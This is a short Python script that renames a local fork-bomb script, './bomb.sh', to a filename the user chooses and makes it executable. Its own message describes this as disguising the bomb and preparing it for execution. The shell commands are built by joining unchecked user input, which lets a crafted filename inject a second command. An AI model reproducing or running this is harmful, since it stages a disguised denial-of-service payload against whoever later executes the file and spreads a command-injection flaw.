# code header
import os

fbomb_name = "./bomb.sh"
print("Disguise and prepare fork bomb for execution.")
new_name = input("Please enter a new filename including extension\n") # you can make weirdly named files like this
if new_name:
    print("renaming...")
    cmdstr = "mv " + fbomb_name + " " + new_name
    print("executing: \n" + cmdstr)
    os.system(cmdstr)
    cmdstr = "chmod +x "
    cmdstr += new_name
    print("changing to executable ($_ chmod +x new_name): \n" + cmdstr)
    os.system(cmdstr)
else:
    print("error in new_name")  
